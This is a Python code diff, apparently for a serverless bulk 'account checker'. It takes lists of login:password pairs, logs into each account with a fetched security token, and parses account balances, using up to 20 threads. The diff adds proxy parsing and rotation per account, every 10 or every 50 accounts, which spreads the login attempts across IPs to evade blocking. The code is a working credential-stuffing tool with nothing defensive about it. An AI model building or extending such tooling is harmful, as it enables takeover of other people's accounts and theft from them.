@@ -96,9 +96,30 @@ def parse_balance(html: str) -> dict:
     return result
 
 
-def check_account(login: str, password: str) -> dict:
+def build_proxy_dict(proxy_str: str, proxy_type: str) -> dict:
+    """Парсит строку прокси в формат для requests."""
+    p = proxy_str.strip()
+    if not p:
+        return {}
+    if "://" in p:
+        return {"http": p, "https": p}
+    parts = p.split(":")
+    if len(parts) == 2:
+        url = f"{proxy_type}://{parts[0]}:{parts[1]}"
+    elif len(parts) == 4:
+        url = f"{proxy_type}://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
+    else:
+        url = f"{proxy_type}://{p}"
+    return {"http": url, "https": url}
+
+
+def check_account(login: str, password: str, proxy_str: str = "", proxy_type: str = "https") -> dict:
     session = requests.Session()
     session.headers.update(HEADERS)
+
+    proxies = build_proxy_dict(proxy_str, proxy_type) if proxy_str else {}
+    if proxies:
+        session.proxies.update(proxies)
 
     try:
         security = get_security_token(session)
@@ -179,6 +200,9 @@ def handler(event: dict, context) -> dict:
 
     accounts_raw = body.get("accounts", [])
     threads = min(int(body.get("threads", 5)), 20)
+    proxy_list = body.get("proxies", [])
+    proxy_type = body.get("proxy_type", "https")
+    proxy_rotation = body.get("proxy_rotation", "each")
 
     if not accounts_raw:
         return {"statusCode": 400, "headers": cors, "body": json.dumps({"error": "No accounts provided"})}
@@ -192,11 +216,28 @@ def handler(event: dict, context) -> dict:
     if not parsed:
         return {"statusCode": 400, "headers": cors, "body": json.dumps({"error": "Invalid format. Use login:password"})}
 
+    def get_proxy_for_index(idx: int) -> str:
+        if not proxy_list:
+            return ""
+        if proxy_rotation == "each":
+            return proxy_list[idx % len(proxy_list)]
+        elif proxy_rotation == "every10":
+            return proxy_list[(idx // 10) % len(proxy_list)]
+        elif proxy_rotation == "every50":
+            return proxy_list[(idx // 50) % len(proxy_list)]
+        return proxy_list[idx % len(proxy_list)]
+
     results = []
     with ThreadPoolExecutor(max_workers=threads) as executor:
         futures = {
-            executor.submit(check_account, a["login"], a["password"]): a
-            for a in parsed
+            executor.submit(
+                check_account,
+                a["login"],
+                a["password"],
+                get_proxy_for_index(i),
+                proxy_type,
+            ): a
+            for i, a in enumerate(parsed)
         }
         for future in as_completed(futures):
             results.append(future.result())
